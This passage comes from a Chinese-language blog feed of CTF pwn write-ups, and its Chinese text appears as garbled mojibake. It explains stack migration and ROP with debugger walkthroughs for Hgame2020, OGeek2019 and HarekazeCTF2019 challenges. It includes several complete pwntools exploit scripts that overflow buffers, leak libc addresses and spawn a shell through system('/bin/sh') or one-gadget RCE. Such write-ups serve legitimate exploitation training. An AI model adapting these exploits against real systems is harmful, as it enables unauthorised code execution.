title="å›¾è§£åˆ†æ"></a>å›¾è§£åˆ†æ</h4><p>å‡è®¾æˆ‘ä»¬å·²ç»å¡«å…¥äº†æº¢å‡ºå­—ç¬¦ï¼Œbuf1å³ä¸ºæˆ‘ä»¬è¦å»çš„æ–°æ ˆï¼Œè¿™ä¸ªé€‰æ‹©bssæ®µçš„åä¸€åŠï¼š<br><img src="https://s2.ax1x.com/2020/02/11/1ogabn.jpg" srcset="/img/loading.gif" alt="1ogabn.jpg"><br>å¼€å§‹æ‰§è¡Œä¸€ä¸‹leave ä¸­çš„<code>mov rsp,rbp</code>ï¼š<br><img src="https://s2.ax1x.com/2020/02/11/1ogUDs.jpg" srcset="/img/loading.gif" alt="1ogUDs.jpg"><br>æ­¤æ—¶rsp ä¹ŸæŒ‡å‘äº† rbpæŒ‡å‘çš„ä½ç½®ï¼Œåœ¨æ‰§è¡Œleaveä¸­çš„<code>pop rbp</code>:<br><img src="https://s2.ax1x.com/2020/02/11/1ocMfU.jpg" srcset="/img/loading.gif" alt="1ocMfU.jpg"><br>æ­¤æ—¶rbpå·²ç»åˆ°äº†æˆ‘ä»¬ä¼ªé€ çš„æ–°æ ˆbuf1ï¼Œç„¶åå¼€å§‹æ‰§è¡Œret,è¿›å…¥æ‰§è¡Œpop_rdiçš„gadget:<br><img src="https://s2.ax1x.com/2020/02/11/1ocZmn.jpg" srcset="/img/loading.gif" alt="1ocZmn.jpg"><br><img src="https://s2.ax1x.com/2020/02/11/1ocklQ.jpg" srcset="/img/loading.gif" alt="1ocklQ.jpg"></p><p>æ­¤æ—¶å·²ç»å°†buf1çš„åœ°å€ï¼Œæ¨å…¥rdiï¼Œä½œä¸ºgetsçš„å‚æ•°ï¼Œæ‰§è¡Œgetså‡½æ•°åï¼Œæˆ‘ä»¬å°±å¯ä»¥å¾€buf1ä¸Šå¡«å…¥æˆ‘ä»¬çš„ropé“¾ï¼Œæ­¤æ—¶æ ˆå¤§å°å·²ç»æ²¡æœ‰é™åˆ¶äº†ï¼Œå¯ä»¥ä»»æ„å†™ã€‚<br><img src="https://s2.ax1x.com/2020/02/11/1o6oo6.jpg" srcset="/img/loading.gif" alt="1o6oo6.jpg"><br><img src="https://s2.ax1x.com/2020/02/11/1o6gWF.jpg" srcset="/img/loading.gif" alt="1o6gWF.jpg"><br>åœ¨è¿™ä¸ªbuf1çš„æ ˆç©ºé—´é‡Œï¼Œæˆ‘ä»¬éœ€è¦å…ˆæŠŠrbpæŒ‡å‘çš„ä½ç½®å†™å…¥buf2ï¼ˆä¸‹ä¸€ä¸ªæ„é€ çš„æ–°æ ˆï¼‰ï¼Œç„¶åæ„é€ ropé“¾æŠŠputsçš„å†…å­˜åœ°å€ç»™æ³„éœ²å‡ºæ¥ï¼Œè¿›è€Œå¯ä»¥ç®—å‡ºlibcçš„åŸºåœ°å€ï¼Œæ¥ç€å†æ„é€ ä¸€ä¸ªgetså‡½æ•°ã€‚æ¥ç€æ˜¯æ‰§è¡Œä¸€ä¸‹leave çš„gadgetï¼š<br><img src="https://s2.ax1x.com/2020/02/11/1o60Ln.jpg" srcset="/img/loading.gif" alt="1o60Ln.jpg"><br><img src="https://s2.ax1x.com/2020/02/11/1o6NRg.jpg" srcset="/img/loading.gif" alt="1o6NRg.jpg"><br>æ‰§è¡Œå®Œä»¥åå°±å¯ä»¥å‘ç°æˆ‘ä»¬ï¼Œå·²ç»å®Œå…¨æ§åˆ¶äº†æ ˆã€‚å¹¶ä¸”å¼€äº†ä¸€ä¸ªbuf2çš„æ–°æ ˆï¼Œç•™ç€åœ¨buf1è°ƒç”¨getså‡½æ•°æ—¶æ¥åœ¨buf2æ–°æ ˆä¸­æ‘†ä¸Šè°ƒç”¨system(/bin/sh)å‡½æ•°çš„ropé“¾ã€‚ç„¶åç»§ç»­æ‰§è¡Œï¼š<br><img src="https://s2.ax1x.com/2020/02/11/1o6tJS.jpg" srcset="/img/loading.gif" alt="1o6tJS.jpg"><br><img src="https://s2.ax1x.com/2020/02/11/1o6Yi8.jpg" srcset="/img/loading.gif" alt="1o6Yi8.jpg"><br>è¿™å°±æ³„éœ²å‡ºäº†putså‡½æ•°çš„å†…å­˜åœ°å€ã€‚æ¥ç€å¼€å§‹å¾€buf2æ–°æ ˆä¸Šè¯»ropé“¾:<br><img src="https://s2.ax1x.com/2020/02/11/1o6lqI.jpg" srcset="/img/loading.gif" alt="1o6lqI.jpg"><br><img src="https://s2.ax1x.com/2020/02/11/1o6QsA.jpg" srcset="/img/loading.gif" alt="1o6QsA.jpg"><br><img src="https://s2.ax1x.com/2020/02/11/1o6VIK.jpg" srcset="/img/loading.gif" alt="1o6VIK.jpg"><br>è¯»å…¥å®Œæˆï¼Œæ¥ç€å†æ¬¡æ‰§è¡Œleaveçš„gadgetï¼š<br><img src="https://s2.ax1x.com/2020/02/11/1o6AVx.jpg" srcset="/img/loading.gif" alt="1o6AVx.jpg"><br><img src="https://s2.ax1x.com/2020/02/11/1oyk4S.jpg" srcset="/img/loading.gif" alt="1oyk4S.jpg"><br>å¯ä»¥çœ‹åˆ°espåˆ°äº†æ–°æ ˆï¼Œrbpå› ä¸ºåˆšåˆšåœ¨buf2å¡«å…¥çš„buf1ï¼Œåˆä¼šåˆ°äº†buf1ï¼Œè¿™ä¸ªåœ°å€å¯ä»¥éšä¾¿å¡«äº†ï¼Œå¯¹åšé¢˜ä¸å½±å“ï¼Œå¡«å†™è¿™ä¸ªåªæ˜¯å¯ä»¥çœ‹åˆ°å†æ¬¡æ ˆè½¬ç§»ã€‚æ¥ç€æ‰§è¡Œbuf2æ–°æ ˆçš„ropé“¾ï¼š<br><img src="https://s2.ax1x.com/2020/02/11/1os600.jpg" srcset="/img/loading.gif" alt="1os600.jpg"><br>å°±å¯ä»¥æ‹¿åˆ°shelläº†ã€‚</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>å€Ÿç€è¿™ä¸ªæ€è·¯å°±å¯ä»¥å¼€å§‹å†™exp:</p><pre><code>from pwn import *import timecontext.arch = &#39;amd64&#39;context.log_level = &#39;debug&#39;e = ELF(&#39;./test&#39;)l = ELF(&#39;/lib/x86_64-linux-gnu/libc-2.23.so&#39;) # io = remote(&#39;127.0.0.1&#39;,4000)io = process(&#39;./test&#39;)pop_rdi_ret = 0x400703pop_rsi_r15_ret= 0x0400701pop_rdx_ret= 0x0400724leave_ret= 0x0400699buf1 = 0x00602000 - 0x200buf2 = buf1 + 0x100padding = 56 - 8puts_plt = e.symbols[&#39;puts&#39;]puts_got = e.got[&#39;puts&#39;]read_add = e.symbols[&#39;read&#39;]io.recvuntil(&#39;:&#39;)p = &#39;a&#39;*padding + flat([buf1,pop_rdi_ret,0,pop_rsi_r15_ret,buf1,0,pop_rdx_ret,0x100,read_add,leave_ret])#raw_input(&#39;-&gt;&#39;)io.send(p)sleep(0.1)p = flat([buf2,pop_rdi_ret,puts_got,puts_plt,pop_rdi_ret,0,pop_rsi_r15_ret,buf2,0,pop_rdx_ret,0x100,read_add,leave_ret])sleep(0.1)#raw_input(&#39;-&gt;&#39;)io.sendline(p)io.recvuntil(&#39;\n&#39;)puts = u64((io.recv(6)).ljust(8,&#39;\x00&#39;))libc = puts - l.symbols[&#39;puts&#39;]print(&#39;libc_base:&#39; + hex(libc))binsh_add = l.search(&#39;/bin/sh\x00&#39;).next() + libc#print(binsh_add)# raw_input(&#39;-&gt;&#39;)system_add = l.symbols[&#39;system&#39;] + libcp = flat([buf1,pop_rdi_ret,binsh_add,system_add])sleep(0.1)io.sendline(p)io.interactive()</code></pre><h3 id="Hgame2020-week2-rop-level2"><a href="#Hgame2020-week2-rop-level2" class="headerlink" title="Hgame2020_week2_rop_level2"></a>Hgame2020_week2_rop_level2</h3><h4 id="æŸ¥ä¿æŠ¤å’Œarch-1"><a href="#æŸ¥ä¿æŠ¤å’Œarch-1" class="headerlink" title="æŸ¥ä¿æŠ¤å’Œarch"></a>æŸ¥ä¿æŠ¤å’Œarch</h4><p><img src="https://s2.ax1x.com/2020/02/11/1os8OI.jpg" srcset="/img/loading.gif" alt="1os8OI.jpg"><br>32ä½ç¨‹åºï¼Œå¼€äº†nxä¿æŠ¤</p><h4 id="idaåˆ†æ-2"><a href="#idaåˆ†æ-2" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h4><p><img src="https://s2.ax1x.com/2020/02/11/1osEO1.md.jpg" srcset="/img/loading.gif" alt="1osEO1.md.jpg"><br>è¿™ä¸ªæ˜æ˜¾çš„æ ˆæº¢å‡ºï¼Œä½†æ˜¯0x60-0x50-0x8 = 8ã€‚å‘ç°åªæœ‰ä¸€ä¸ªgadgetä½ç½®ï¼Œæ— æ³•æ„é€ æˆ‘ä»¬æƒ³è¦çš„ropé“¾ã€‚ä½†æ˜¯å‰é¢çš„ç¬¬ä¸€ä¸ªreadå‡½æ•°ï¼Œå¯ä»¥è¯»å…¥å¾ˆå¤§ç©ºé—´ï¼Œå¹¶ä¸”ç¬¬äºŒä¸ªå‚æ•°bufçš„åœ°å€æ˜¯å›ºå®šçš„ã€‚<br><img src="https://s2.ax1x.com/2020/02/11/1orMMn.jpg" srcset="/img/loading.gif" alt="1orMMn.jpg"><br>é‚£è¿™ä¸ªé¢˜æ˜æ˜¾å°±æ˜¯å¯ä»¥Stack Migrationæ¥è§£å†³é—®é¢˜äº†ï¼Œå¹¶ä¸”åªéœ€å†å†™ä¸€ä¸ªleave retå°±æ§åˆ¶æ ˆäº†ã€‚</p><h5 id="æ”»å‡»æ€è·¯"><a href="#æ”»å‡»æ€è·¯" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h5><p>ç¨‹åºä¸­æœ‰ç€openï¼Œreadï¼Œputså‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥å†™ä¸€ä¸ªropé“¾ï¼Œè°ƒç”¨openå‡½æ•°ï¼Œæ§åˆ¶å…¶å‚æ•°æ˜¯<code>./flag</code>ï¼Œå¹¶åœ¨gdbä¸­è°ƒè¯•å°†å…¶è¿”å›çš„æ–‡ä»¶fdå·è®°å½•ä¸‹æ¥ï¼Œç„¶åä¼ é€’ç»™readå‡½æ•°ï¼Œè®©å…¶è¯»å…¥æ–‡ä»¶å†…å®¹å­˜å…¥æŸä¸ªç¼“å†²åŒºï¼Œå†ç”¨putså‡½æ•°è¾“å‡ºä¸€ä¸‹flagæ–‡ä»¶çš„å†…å®¹å³å¯ã€‚åœ¨ç¬¬ä¸€ä¸ªreadçš„æ—¶å€™ï¼Œæˆ‘ä»¬å°±éœ€è¦å†™å¥½ropé“¾ã€‚ç„¶ååœ¨æœ€åä¸€ä¸ªreadå‡½æ•°æ—¶ï¼Œæ§åˆ¶å¥½ebpæŒ‡å‘æˆ‘ä»¬çš„æ–°æ ˆã€‚</p><h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h4><pre><code>from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;amd64&#39;# io = process(&#39;./ROP&#39;)io = remote(&#39;47.103.214.163&#39;,20300)e = ELF(&#39;./ROP&#39;)buf = 0x06010A0# libc = e.libcpadding = 80leave_ret = 0x040090dpop_rdi_ret = 0x00400a43pop_rsi_r15 = 0x00400a41open_plt = 0x4007b0read_plt = 0x400780puts_plt = 0x400760io.recvuntil(&#39;think so?\n&#39;)p = flat([&#39;./flag\x00\x00&#39;,pop_rdi_ret,buf,pop_rsi_r15,0,0,open_plt,pop_rdi_ret,4,pop_rsi_r15,buf+0x80,0,read_plt,pop_rdi_ret,buf+0x80,puts_plt])io.sendline(p)io.recvuntil(&#39;\n&#39;)p = padding * &#39;a&#39; + p64(buf) + p64(leave_ret)raw_input(&#39;-&gt;&#39;) #æ‰‹åŠ¨ä¸‹ä¸€ä¸ªæ–­ç‚¹ï¼Œä»¥åè®©gdbé™„åŠ ä¸Šè¿›è¡Œè°ƒè¯•io.send(p)flag = io.recvline_contains(&#39;hgame&#39;)print(flag)io.interactive()</code></pre><p>æˆ‘ä»¬è·Ÿç€expæ¥è°ƒè¯•ä¸€ä¸‹ï¼Œçœ‹çœ‹æ•ˆæœï¼š<br><img src="https://s2.ax1x.com/2020/02/11/1or3ZV.jpg" srcset="/img/loading.gif" alt="1or3ZV.jpg"><br>æ­¤æ—¶çš„espæ˜¯æˆ‘ä»¬ä¼ªé€ çš„new espï¼Œå·²ç»æŒ‡å‘äº†æˆ‘ä»¬çš„ç›®æ ‡ä½ç½®ï¼Œå¹¶ä¸”ç¬¬ä¸€ä¸ªropé“¾æ¥å·²ç»é€è¿‡å»ï¼Œå¯ä»¥çœ‹åˆ°<code>./flag</code>çš„å­—çœ¼ã€‚æ‰§è¡Œä¸€ä¸‹leaveï¼š<br><img src="https://s2.ax1x.com/2020/02/11/1orGIU.jpg" srcset="/img/loading.gif" alt="1orGIU.jpg"><br>å¯ä»¥çœ‹åˆ°rbpçš„å€¼å·²ç»ç­‰äºæˆ‘ä»¬ä¼ªé€ çš„å€¼ï¼Œespè¿˜åœ¨åŸæ¥æ ˆä¸Šã€‚æ¥ç€æ‰§è¡Œretï¼Œè¿›å…¥ä¸‹ä¸€ä¸ªleave retï¼š<br><img src="https://s2.ax1x.com/2020/02/11/1orQrq.jpg" srcset="/img/loading.gif" alt="1orQrq.jpg"><br>å…ˆè®°å½•ä¸‹å½“å‰çš„çŠ¶æ€ï¼Œå¼€å§‹æ‰§è¡Œleaveï¼š<br><img src="https://s2.ax1x.com/2020/02/11/1or8aT.jpg" srcset="/img/loading.gif" alt="1or8aT.jpg"><br>æ‰§è¡Œå®Œå‘ç°espå·²ç»åˆ°è¾¾äº†æ–°æ ˆbuf+8çš„ä½ç½®ï¼Œæ­¤æ—¶çš„æ ˆå¸§å·²ç»æ˜¯æˆ‘ä»¬å®Œå…¨æƒ³è¦çš„ï¼Œå·²ç»åŠ«æŒäº†ç¨‹åºæµç¨‹ï¼Œå¹¶ä¸”æ–°æ ˆç©ºé—´å¾ˆå¤§ï¼Œå¯ä»¥æ»¡è¶³æˆ‘ä»¬çš„éœ€æ±‚ã€‚ebpæ˜¯å¤šå°‘å·²ç»ä¸é‡è¦äº†ï¼Œæˆ‘ä»¬ç›´æ¥å¡«å…¥<code>./flag</code>ï¼Œè¿™ä¸ªå›ºå®šåœ°å€ä¹Ÿåšä¸ºç»™openå‡½æ•°åšå‚æ•°ã€‚<br><img src="https://s2.ax1x.com/2020/02/11/1ormGQ.jpg" srcset="/img/loading.gif" alt="1ormGQ.jpg"><br>åœ¨è°ƒè¯•çš„æ—¶å€™ï¼Œæ‰§è¡Œå®Œopenå‡½æ•°éœ€è¦æŠŠè¿”å›çš„fdå€¼è®°å½•ä¸‹ï¼Œç»™readå‡½æ•°åšå‚æ•°ã€‚æœ€åç”±putså‡½æ•°åœ¨è¾“å‡ºflagï¼š<br><img src="https://s2.ax1x.com/2020/02/11/1oDzPe.jpg" srcset="/img/loading.gif" alt="1oDzPe.jpg"></p><h3 id="Stack-Migrationå°æ€»ç»“"><a href="#Stack-Migrationå°æ€»ç»“" class="headerlink" title="Stack Migrationå°æ€»ç»“"></a>Stack Migrationå°æ€»ç»“</h3><p> è¿™ä¸‹å¯ä»¥æ€»ç»“ä¸‹åˆ©ç”¨æ€è·¯ä¹Ÿå°±æ˜¯</p><ul><li>æŠŠæ§å¥½èµ·åˆæ ˆçš„ebpï¼Œåœ¨é‡Œé¢å†™å…¥éœ€è¦ä¼ªé€ çš„new esp</li><li>åœ¨ä¹‹åçš„å¯åˆ©ç”¨å­—èŠ‚ä¸­å†™å…¥leave gadget</li><li>å°†æƒ³æ‰§è¡Œçš„ROP Chainå†™åœ¨å·²çŸ¥å›ºå®šä½ç½®ä¸Š</li><li>å†åˆ©ç”¨leaveæ¬ç§»Stackä½ç½®åˆ°å·²çŸ¥ä½ç½®</li><li>ç„¶åæ— é™æ¥ROP Chain</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>å­¦ä¹ è®°å½•</tag>
      
      <tag>Stack Migration</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ROPé¢˜ç›®ç»ƒä¹ </title>
    <link href="/2020/02/03/ROP%E7%BB%83%E4%B9%A0/"/>
    <url>/2020/02/03/ROP%E7%BB%83%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="ROPé¢˜ç›®ç»ƒä¹ "><a href="#ROPé¢˜ç›®ç»ƒä¹ " class="headerlink" title="ROPé¢˜ç›®ç»ƒä¹ "></a>ROPé¢˜ç›®ç»ƒä¹ </h1><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æœ€è¿‘åœ¨å­¦ä¹ æ ˆæº¢å‡ºï¼Œåšäº†ä¸€äº›ROPçš„ç»ƒä¹ é¢˜ï¼ŒåŸºæœ¬éƒ½æ˜¯buuojçš„é¢˜ç›®ï¼Œæœç´¢ropå­—çœ¼æ‰¾çš„ropé¢˜ã€‚ç®€å•è®°å½•ä¸€ä¸‹æ”¶è·å’Œexpã€‚</p><h1 id="æœ‰libcï¼ˆæˆ–è€…æ— libcå¯åšï¼‰"><a href="#æœ‰libcï¼ˆæˆ–è€…æ— libcå¯åšï¼‰" class="headerlink" title="æœ‰libcï¼ˆæˆ–è€…æ— libcå¯åšï¼‰"></a>æœ‰libcï¼ˆæˆ–è€…æ— libcå¯åšï¼‰</h1><h2 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="OGeek2019_babyrop"></a>OGeek2019_babyrop</h2><h3 id="æŸ¥ä¿æŠ¤å’Œarch"><a href="#æŸ¥ä¿æŠ¤å’Œarch" class="headerlink" title="æŸ¥ä¿æŠ¤å’Œarch"></a>æŸ¥ä¿æŠ¤å’Œarch</h3><p><img src="/2020/02/03/ROPç»ƒä¹ /images/15807186229840.jpg" srcset="/img/loading.gif" alt="-w621"><br>32ä½ç¨‹åºï¼Œå¼€å¯NXå †æ ˆä¸å¯æ‰§è¡Œã€‚</p><h3 id="idaåˆ†æ"><a href="#idaåˆ†æ" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><p><img src="/2020/02/03/ROPç»ƒä¹ /images/15807186890200.jpg" srcset="/img/loading.gif" alt="-w373"><br>å¯ä»¥çœ‹å‡ºå…¶å–äº†ä¸€ä¸ªéšæœºæ•°ï¼Œå­˜å…¥bufã€‚<br><img src="/2020/02/03/ROPç»ƒä¹ /images/15807187726931.jpg" srcset="/img/loading.gif" alt="-w413"><br>ç„¶åè¿›å…¥è¿™ä¸ªå‡½æ•°åˆ†æï¼Œçœ‹åˆ°æ¥æ”¶bufä¼ æ¥çš„å€¼ï¼Œæ”¾å…¥sä¸­ã€‚ç„¶åä¸‹é¢æ¥æ”¶ä½ ä¼ å…¥çš„ä¸œè¥¿ï¼Œä¸såˆ¤æ–­æ˜¯å¦ç›¸åŒï¼Œä¸ç›¸åŒå°±ä¼šé€€å‡ºã€‚ç„¶åå¦‚æœä¸é€€å‡ºè¿”å›å€¼æ˜¯v5ï¼Œä½†æ˜¯è¿™é‡Œçš„v5åœ¨å‡½æ•°ä¸­æ˜¯æ²¡æœ‰ç»è¿‡å¤„ç†çš„ã€‚çœ‹ä¸€ä¸‹æ±‡ç¼–ï¼š<br><img src="/2020/02/03/ROPç»ƒä¹ /images/15807191082469.jpg" srcset="/img/loading.gif" alt="-w508"><br>v5å’±ä»¬æƒ³æ§åˆ¶ï¼Œå°±åªèƒ½é€šè¿‡åŸæ¥é‚£ä¸ªreadå‡½æ•°ï¼Œå’±ä»¬ä¼ å…¥çš„å€¼å»æ§åˆ¶ã€‚è¿”å›å€¼ç»™v2ï¼Œç„¶åv2ä½œä¸ºå‚æ•°ç„¶åè¿›å…¥ä¸‹é¢è¿™ä¸ªå¸¦æœ‰æº¢å‡ºçš„å‡½æ•°ä¸­ã€‚<br> <img src="/2020/02/03/ROPç»ƒä¹ /images/15807191871406.jpg" srcset="/img/loading.gif" alt="-w375"><br>è§‚å¯Ÿåï¼Œå¯ä»¥çœ‹å‡ºå’±ä»¬åº”è¯¥æŠŠè¿™ä¸ªè¿”å›çš„å‚æ•°æ•´çš„å¤§ä¸€ç‚¹ï¼Œæ–¹ä¾¿è¿›è¡Œå†™ROPé“¾ã€‚</p><h4 id="åˆ†ææ€»ç»“"><a href="#åˆ†ææ€»ç»“" class="headerlink" title="åˆ†ææ€»ç»“"></a>åˆ†ææ€»ç»“</h4><p>å…¶ä¸­å¯¹äºç»•è¿‡ç›¸ç­‰åˆ¤æ–­ï¼Œå¯ä»¥åˆ©ç”¨ä¸€ä¸‹strlenå‡½æ•°çš„ç‰¹æ€§ï¼Œç„¶åç›´æ¥ç”¨<code>\x00</code>æ¥æˆªæ–­ã€‚<br>v5è¿™ä¸ªè¿”å›å‚æ•°å¯ä»¥æ§åˆ¶ä¸ºâ€™\xffâ€™,ç„¶åè¿›å…¥å¸¦æœ‰æº¢å‡ºçš„å‡½æ•°ï¼Œå†™ropé“¾å°±è¡Œäº†ã€‚<br>å…ˆç”¨putså‡½æ•°æ³„éœ²å‡º<code>__libc_start_main</code>çš„åœ°å€ï¼Œç„¶ååœ¨ç»™çš„libcä¸­ç¡®è®¤ä¸‹symbolsï¼Œç„¶åæ‹¿åˆ°libcåŸºå€ï¼Œç„¶åç›´æ¥åˆ©ç”¨one gadget RCEå³å¯ã€‚</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import time# io = process(&#39;./pwn&#39;)io = remote(&#39;node3.buuoj.cn&#39;,27780)libc = ELF(&#39;./libc-2.23.so&#39;)# blibc = ELF(&#39;/lib/i386-linux-gnu/libc-2.23.so&#39;)elf = ELF(&#39;./pwn&#39;)# raw_input(&#39;-&gt;&#39;)p1 = &#39;\x00&#39;.ljust(8,&#39;\xff&#39;) offset = 0xe7 + 4io.send(p1 + &#39;\n&#39;)io.recvline_contains(&#39;Correct&#39;)start_add=0x080485A0put_add = elf.symbols[&#39;puts&#39;]libc_start_add = elf.got[&#39;__libc_start_main&#39;]rop1 = [    put_add,    start_add,    libc_start_add]p2 = offset * &#39;\x00&#39; + &#39;&#39;.join(map(p32,rop1))io.sendline(p2)sleep(1)libc_base = u32(io.recv(4)) - libc.symbols[&#39;__libc_start_main&#39;]REC = libc_base+0x3a80cprint(&#39;libc_base :&#39;+hex(libc_base))offset = 0xe7 + 4io.send(p1 + &#39;\n&#39;)io.recvline_contains(&#39;Correct&#39;)p3 = offset * &#39;\x00&#39; + p32(REC)io.sendline(p3)io.interactive()</code></pre><h2 id="HarekazeCTF2019-baby-rop"><a href="#HarekazeCTF2019-baby-rop" class="headerlink" title="HarekazeCTF2019_baby_rop"></a>HarekazeCTF2019_baby_rop</h2><h3 id="æŸ¥ä¿æŠ¤å’Œarch-1"><a href="#æŸ¥ä¿æŠ¤å’Œarch-1" class="headerlink" title="æŸ¥ä¿æŠ¤å’Œarch"></a>æŸ¥ä¿æŠ¤å’Œarch</h3><p><img src="/2020/02/03/ROPç»ƒä¹ /images/15807395869628.jpg" srcset="/img/loading.gif" alt="-w624"></p><h3 id="idaåˆ†æ-1"><a href="#idaåˆ†æ-1" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><pre><code>int __cdecl main(int argc, const char **argv, const char **envp){  char v4; // [rsp+0h] [rbp-10h]  system(&quot;echo -n \&quot;What&#39;s your name? \&quot;&quot;);  __isoc99_scanf(&quot;%s&quot;, &amp;v4);  printf(&quot;Welcome to the Pwn World, %s!\n&quot;, &amp;v4);  return 0;}</code></pre><p>ç¨‹åºååˆ†ç®€å•ï¼Œç»™äº†systemå‡½æ•°ï¼Œä¸”æ˜æ˜¾å­˜åœ¨æº¢å‡ºã€‚<br><img src="/2020/02/03/ROPç»ƒä¹ /images/15807396970009.jpg" srcset="/img/loading.gif" alt="-w502"><br>idaæŸ¥çœ‹å­—ç¬¦ä¸²ï¼Œè¯¥å¯ä»¥å‘ç°<code>/bin/sh</code>/ï¼Œè¿™æ„é€ ä¸ªç®€å•ropé“¾ç›´æ¥åˆ©ç”¨å°±å¥½äº†ã€‚</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre><code>from pwn import *import time# io = process(&#39;./babyrop&#39;)io = remote(&#39;node3.buuoj.cn&#39;,28633)elf = ELF(&#39;./babyrop&#39;)offset = 0x10 + 8binsh_add = 0x0601048pop_rdi_ret=0x000400683 system_add = elf.symbols[&#39;system&#39;]# io.recvline_contains(&#39;your&#39;)# raw_input(&#39;-&gt;&#39;)p = &#39;a&#39; * offset + p64(pop_rdi_ret) + p64(binsh_add) + p64(system_add)io.sendline(p)io.interactive()</code></pre><p>æ‹¿åˆ°shellåï¼Œè¿™ä¸ªé¢˜buuctfæ ¹ç›®å½•ä¸‹æ²¡æœ‰flagæ–‡ä»¶ã€‚éœ€è¦<code>find / -name &quot;flag&quot;</code> å¯ä»¥æŸ¥åˆ°æ˜¯åœ¨<code>/home/babyrop/flag</code>è¿™ä¸ªç›®å½•ä¸‹ã€‚</p><h2 id="HarekazeCTF2019-baby-rop2"><a href="#HarekazeCTF2019-baby-rop2" class="headerlink" title="HarekazeCTF2019_baby_rop2"></a>HarekazeCTF2019_baby_rop2</h2><h3 id="æŸ¥ä¿æŠ¤å’Œarch-2"><a href="#æŸ¥ä¿æŠ¤å’Œarch-2" class="headerlink" title="æŸ¥ä¿æŠ¤å’Œarch"></a>æŸ¥ä¿æŠ¤å’Œarch</h3><p><img src="/2020/02/03/ROPç»ƒä¹ /images/15808200972779.jpg" srcset="/img/loading.gif" alt="-w310"></p><h3 id="idaåˆ†æ-2"><a href="#idaåˆ†æ-2" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><p><img src="/2020/02/03/ROPç»ƒä¹ /images/15808200578822.jpg" srcset="/img/loading.gif" alt="-w577"><br>å‡½æ•°è¿‡ç¨‹å¾ˆç®€å•ï¼Œæ˜æ˜¾æ ˆæº¢å‡ºï¼Œæ€è·¯å°±æ˜¯å…ˆæ ˆæº¢å‡ºæ„é€ ropé“¾ï¼Œè®©pintfå‡½æ•°æ‰“å°å‡º<code>__libc_start_main</code>å‡½æ•°åœ¨å†…å­˜çš„åœ°å€ï¼Œç„¶ååœ¨ç»™çš„libcæ–‡ä»¶ä¸­è·å–ä¸€ä¸‹å…¶sympolæ˜¯çš„å€¼ï¼Œç„¶åå†è®¡ç®—å‡ºå®ƒçš„åŸºå€ï¼Œå†è®©å‡½æ•°è¿”å›åˆ°shartå¤„æ¸…ç†ä¸€ä¸‹æ ˆï¼Œç„¶åå†æ¬¡åˆ©ç”¨onegadget RCEæ„é€ ç›¸å…³ropé“¾å³å¯ã€‚</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><pre><code>from pwn import *import timeio = process(&#39;./babyrop2&#39;)# blibc = ELF(&#39;/lib/x86_64-linux-gnu/libc-2.23.so&#39;)# context.log_level = &#39;debug&#39;libc = ELF(&#39;./libc.so.6&#39;)io = remote(&#39;node3.buuoj.cn&#39;,27694)elf = ELF(&#39;./babyrop2&#39;)offset = 40__libc_start_add = elf.got[&#39;__libc_start_main&#39;]start_add = 0x0400540 printf_add = elf.symbols[&#39;printf&#39;]aWelcomeToThePw = 0x400770 pop_rdi_ret= 0x000400733pop_rsi_r15_ret = 0x00400731 libc_start_sys = libc.symbols[&#39;__libc_start_main&#39;]rop1 = [    pop_rdi_ret,    aWelcomeToThePw,    pop_rsi_r15_ret,    __libc_start_add,    0,    printf_add,    start_add]io.recvuntil(&#39;e? &#39;)# io.recvuntil(&#39;again, &#39;)# raw_input(&#39;-&gt;&#39;)p = &#39;a&#39; * offset + &#39;&#39;.join(map(p64,rop1))io.sendline(p)io.recvline_contains(&#39;again&#39;)s = io.recvline_contains(&#39;again&#39;)libc_base = int(u64(s[32:38].ljust(8,&#39;\x00&#39;))) - libc_start_sysRCE = libc_base + 0x4526aprint(&#39;libc_base:&#39;+hex(libc_base))io.recvuntil(&#39;name? &#39;)# io.recvuntil(&#39;name? &#39;)p = &#39;\x00&#39; * offset + p64(RCE) + &#39;\x00&#39; * 70sleep(1)raw_input(&#39;-&gt;&#39;)io.sendline(p)io.interactive()</code></pre><h1 id="æ— libc"><a href="#æ— libc" class="headerlink" title="æ— libc"></a>æ— libc</h1><p>è¿™ä¸€éƒ¨åˆ†ç›®å‰ä¸»è¦æ˜¯åˆ©ç”¨LibcSearcheræ¥åšçš„ï¼Œæœ‰æ—¶å€™é¢˜ç›®ä¸ç»™libcï¼Œç”¨è¿™ä¸ªä¹Ÿå¯ä»¥è§£å†³éƒ¨åˆ†é¢˜ç›®ã€‚~~ç”¨è¿™ä¸ªä»¥åå°±ä¸èƒ½å¾ˆæ–¹ä¾¿çš„ç”¨onegadgetå»ä¸€é”®æ‹¿shelläº†ï¼Œæ„Ÿè§‰è¿˜æ˜¯æœ‰åŠæ³•çš„ï¼Œæƒ³åŠæ³•æ‹¿åˆ°LibcSearcherè·å–åˆ°çš„libcç‰ˆæœ¬å°±å¥½äº†ï¼Œæ‰¾ä¸ªæ—¶é—´å»å®è·µä¸€ä¸‹ï¼Œå…ˆæ…¢æ…¢æ„å»ºropé“¾å°±å¥½ï¼Œæ­£å¥½ç»ƒä¹ ä¸€ä¸‹è¿™ç§æ–¹æ³•æ‹¿shellã€‚~~<br>å·²ç»æµ‹è¯•å‡ºåŠæ³•å’¯ã€‚<br><code>https://github.com/lieanu/LibcSearcher</code></p><h2 id="bjdctf-2020-babyrop"><a href="#bjdctf-2020-babyrop" class="headerlink" 